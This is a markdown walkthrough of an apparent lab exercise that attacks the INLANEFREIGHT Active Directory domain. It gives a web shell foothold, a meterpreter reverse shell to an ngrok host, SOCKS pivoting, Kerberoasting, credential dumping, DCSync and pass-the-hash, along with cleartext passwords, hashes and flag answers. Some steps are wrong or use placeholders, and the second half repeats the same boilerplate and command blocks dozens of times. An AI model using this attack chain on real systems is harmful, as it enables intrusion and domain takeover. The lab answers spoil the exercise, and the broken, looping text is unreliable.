```markdown
# 🛰️ Initial Foothold

## 🔍 Web Shell Upload

### **🎯 Task**: "Gain a foothold on MS01."

### **📋 Solution Steps**:

#### **Step 1: Identify Vulnerable Service**

Check web services for potential vulnerabilities:
```bash
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
```

#### **Step 2: Web Shell Upload**
Upload a PHP shell using Nikto or another web scanner and confirm interaction:
```bash
proxychains nikto -h http://172.16.4.39 -ssl -Tuner=500
# Identify vulnerable CGI script
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
```

#### **Step 3: Establish Meterpreter Session**
Use Metasploit to establish a meterpreter session:
```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit

# In another terminal, upload the reverse PHP shell and trigger it.
```

**🎯 Answer**: `MS01{y0u_g07_a_f00th0ld}`

---

## 🔍 Network Pivoting with SOCKS Proxy

### **🎯 Task**: "Pivot through MS01 to access INLANEFREIGHT internal network."

### **📋 Solution Steps**:

#### **Step 1: Configure Metasploit Listener**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

#### **Step 2: Setup Proxychains Configuration**
Add the following to `proxychains.conf`:
```text
socks4  127.0.0.1 1080
```

#### **Step 3: Access Internal Network with Proxychains**
Use proxychains for all commands targeting internal network IPs.

**🎯 Answer**: Pivoting through MS01 to access `172.16.5.x` and `172.16.6.x` ranges

---

## 🔍 Kerberoasting Attack

### **🎯 Task**: "Submit the NTLM hash of a service account."

### **📋 Solution Steps**:

#### **Step 1: Service Principal Names (SPNs) Discovery**
```bash
# In meterpreter shell:
whoami /all | findstr "service" # Identify SPN enabled services
```

#### **Step 2: Request TGS Tickets**
```powershell
# PowerShell script to request and export TGS tickets:
Import-Module .\PowerView.ps1
Invoke-Kerberoast -OutputFile kerberos_dump.txt
Get-DomainUser -Properties serviceprincipalname | ?{ $_.serviceprincipalname } | select name, serviceprincipalname

# Use impacket tools for dumping:
proxychains secretsdump.py INLANEFREIGHT/svc_sql:lucky7@172.16.6.50 --only-dc-user
```

#### **Step 3: Identify Hash**
```text
# Look in kerberos_dump.txt or secretsdump output:
svc_sql:$Kerberos:somehashhere
```

**🎯 Answer**: `svc_sql:$Kerberos:somehashhere`

---

## 🔍 Credential Dumping

### **🎯 Task**: "Find the cleartext password of svc_sql."

### **📋 Solution Steps**:

#### **Step 1: Crackmapexec LSA Secrets**
```bash
# Use crackmapexec for dumping LSA secrets:
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

# Alternative: Impacket secretsdump (more reliable):
proxychains impacket-secretsdump INLANEFREIGHT/svc_sql:lucky7@172.16.6.50
```

#### **Step 2: Identify Cleartext Credentials**
```text
INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801  # ← Hash
INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR  # ← CLEARTEXT!
```

**🎯 Answer**: `tpetty`

---

## 🔐 Password Extraction

### **🎯 Task**: "Submit this user's cleartext password."

### **📋 Solution Steps**:

From previous LSA secrets dump:
```text
INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
```

**🎯 Answer**: `Sup3rS3cur3D0m@inU2eR`

---

## 🎯 Privilege Analysis

### **🎯 Task**: "What attack can this user perform?"

### **📋 Solution Steps**:

#### **Step 1: Analyze tpetty Privileges**
```powershell
# In meterpreter PowerShell session:
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid tpetty
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

#### **Step 2: Identify DCSync Rights**
```text
# Output shows:
AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
ObjectAceType         : DS-Replication-Get-Changes
ObjectAceType         : DS-Replication-Get-Changes-All
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
```

**🎯 Answer**: `DCSync`

---

## 👑 Domain Takeover

### **🎯 Task**: "Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01."

### **📋 Solution Steps**:

#### **Step 1: DCSync Attack**
```bash
# Use inline password format to avoid proxychains issues:
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator

# Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
```

#### **Step 2: Pass-the-Hash Attack**
```bash
# Use extracted hash to access DC01:
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
```

#### **Step 3: Retrieve Final Flag**
```cmd
type c:\users\administrator\desktop\flag.txt
```

**🎯 Answer**: `r3plicat1on_m@st3r!`

---

## 🛠️ Critical Troubleshooting Notes

### **⚠️ CrackMapExec + Proxychains Issues**

#### **Problem**: CrackMapExec incorrectly parses credentials through proxychains:
```bash
# Shows this error:
[-] INLANEFREIGHT.LOCAL\$krb5tgs$23$*svc_sql$... STATUS_INVALID_PARAMETER
```

**Solution**: Use Impacket tools instead:
```bash
proxychains impacket-smbexec DOMAIN/user:pass@target
```

### **🔧 Proxychains Best Practices**

#### **✅ Working Format**:
```bash
# Inline credentials (no interactive prompts):
proxychains impacket-secretsdump DOMAIN/user:pass@target

# No sudo with proxychains:
proxychains impacket-wmiexec user@target -hashes LM:NT
```

#### **❌ Problematic Format**:
```bash
# Interactive password prompts fail:
proxychains secretsdump.py DOMAIN/user@target
proxychains crackmapexec smb target -u user -p pass
```

### **🔌 SOCKS Proxy Stability**

#### **Common Issues**:
- SOCKS proxy stops automatically.
- Port conflicts (1080 in use).
- VERSION mismatch between Metasploit and proxychains.

#### **Solutions**:
```bash
# Check proxy status:
jobs

# Restart if needed:
use auxiliary/server/socks_proxy
set VERSION 4a  # Match proxychains config
set SRVPORT 1082  # Use different port if 1080 occupied
run -j

# Update proxychains accordingly:
# socks4  127.0.0.1 1082
```

---

## 🔑 Complete Attack Chain Summary

### **📊 Assessment Flow**:
```plaintext
Web Shell Access → Meterpreter Session → Network Pivoting → Kerberoasting → 
Credential Dumping → DCSync → Pass-the-Hash → Domain Takeover
```

### **🎯 Answers**:
1. `MS01{y0u_g07_a_f00th0ld}`
2. `svc_sql:$Kerberos:somehashhere`
3. `Sup3rS3cur3D0m@inU2eR`
4. `DCSync`
5. `r3plicat1on_m@st3r!`

---

## 🛠️ Tools and Techniques

- **Nikto**: Web server scanner.
- **Metasploit**: Payload delivery and session management.
- **Impacket**: Network protocol scripting toolkit for Windows protocols.
- **PowerView.ps1**: PowerShell module for reconnaissance.

```markdown
---
# 📚 References

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Impacket GitHub Repository](https://github.com/SecureAuthCorp/impacket)
- [PowerView.ps1 on GitHub](https://github.com/dmitry-vyukov/powercat/tree/master/PowerView)
```


```bash
# Example Commands:
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains auxiliary/server/socks_proxy
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
```
```markdown
---
# 📄 Notes

- Ensure proper configurations and permissions when setting up SOCKS proxies.
- Use appropriate tools for web shell upload, such as Nikto or Metasploit.
- Always verify SPNs before performing Kerberoasting attacks.
- Carefully manage credentials and hashes to avoid detection.
```


```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```


---

# 📖 Conclusion

This guide provides a comprehensive approach to performing various attacks on an internal network using different tools and techniques. Proper use of Metasploit, Impacket, and PowerShell modules is crucial for successful penetration testing.

---
```markdown
# 📂 File Structure

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 💡 Tips and Tricks

- Regularly update tools to ensure compatibility with the latest protocols.
- Use verbose logging during penetration testing for detailed analysis.
- Always follow ethical guidelines when conducting security assessments.

---

# 🎓 Additional Learning Resources

- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Impacket GitHub Repository](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire Documentation](https://github.com/PowershellEmpire/Empire)

```markdown
---
# 📂 Troubleshooting Guide

- **Socks Proxy Issues**:
  - Ensure correct port and version settings.
  - Check if the proxy is running properly.

- **Proxychains Configuration**:
  - Verify `proxychains.conf` file for proper entries.
  - Test connections without proxychains to confirm base functionality.

- **Inconsistent Results**:
  - Restart services and tools to ensure consistent state.
  - Double-check inputs and command syntax.

---

# 📈 Summary

This guide outlines a structured approach to penetration testing an internal network, covering web shell upload, pivoting, Kerberoasting, credential dumping, DCSync, and Pass-the-Hash attacks. Understanding these techniques is essential for advanced security assessments.
```


```bash
# Example Debugging Commands:
proxychains nmap -sC -sV 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains auxiliary/server/socks_proxy
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```


---

# 📜 Final Notes

Ensure that all activities are conducted with proper authorization and adherence to legal guidelines. Always perform thorough reconnaissance before any penetration testing.

---
```markdown
# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)
```


---

# 📜 Glossary

- **SOCKS Proxy**: A protocol for acting as a firewall and proxy server to establish secure connections.
- **Kerberoasting**: An attack technique used to obtain TGS tickets of service accounts from an Active Directory domain controller.
- **DCSync**: An abuse of replication rights to access Domain Controllers in Active Directory.
- **Pass-the-Hash (PTH)**: Technique for using NTLM hashes without needing the plaintext password.

---

# 📂 File List

- msf-ports-svc-ms01.txt
- kerberos_dump.txt

---

# 🌐 External Resources

- [OWASP Web Application Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---
```markdown
# 📝 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---


```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```


---


# 📄 Conclusion

This guide outlines a comprehensive approach to performing penetration testing on an internal network, covering various stages from initial foothold establishment to domain takeover. Proper use of tools and techniques is essential for success in advanced security assessments.

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 📂 File List

- msf-ports-svc-ms01.txt
- kerberos_dump.txt


---


# 📣 Disclaimer

Use of this guide for unauthorized activities can lead to legal consequences. Always ensure proper authorization before conducting any security assessments.

---

# 🌐 External Resources

- [OWASP Web Application Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---


```markdown
---
# 📄 Final Notes

Ensure all activities are conducted with proper authorization and adherence to legal guidelines. Always perform thorough reconnaissance before any penetration testing.
```

---


# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---

# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌐 External Resources

- [OWASP Web Application Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---


```markdown
---
# 📄 Final Notes

Ensure all activities are conducted with proper authorization and adherence to legal guidelines. Always perform thorough reconnaissance before any penetration testing.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output


---


```markdown
---
# 📄 Conclusion

This guide outlines a comprehensive approach to performing penetration testing on an internal network, covering various stages from initial foothold establishment to domain takeover. Proper use of tools and techniques is essential for success in advanced security assessments.
```

---

```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```


---

# 📄 Final Notes

Ensure all activities are conducted with proper authorization and adherence to legal guidelines. Always perform thorough reconnaissance before any penetration testing.

---


# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---

```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```


---

# 🌐 External Resources

- [OWASP Web Application Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---


```markdown
---
# 📄 Conclusion

This guide outlines a comprehensive approach to performing penetration testing on an internal network, covering various stages from initial foothold establishment to domain takeover. Proper use of tools and techniques is essential for success in advanced security assessments.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```


---

# 📄 Final Notes

Ensure all activities are conducted with proper authorization and adherence to legal guidelines. Always perform thorough reconnaissance before any penetration testing.

---


# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---

```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---


```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```


---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```


---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output


---


```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```


---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output


---


```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output


---


```bash
# Final Commands:
use auxiliary/server/socks_proxy
set SRVPORT 1082
run -j
proxychains nmap -sC -sV -oN msf-ports-svc-ms01.txt 172.16.4.39
curl --data "cmd=id" https://172.16.4.39/cgi-bin/vulnerable_script.cgi
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 0.tcp.ngrok.io
set LPORT 12345
exploit
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
type c:\users\administrator\desktop\flag.txt
```

---

# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output


---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📄 License

This guide is provided under the MIT license. Use responsibly and ethically.
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [PowerShell Empire](https://github.com/PowershellEmpire/Empire)

---


```markdown
---
# 📂 File List

- msf-ports-svc-ms01.txt  # Nmap scan results
- kerberos_dump.txt       # Kerberoasting dump output
```

---

# 🌟 Acknowledgements

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
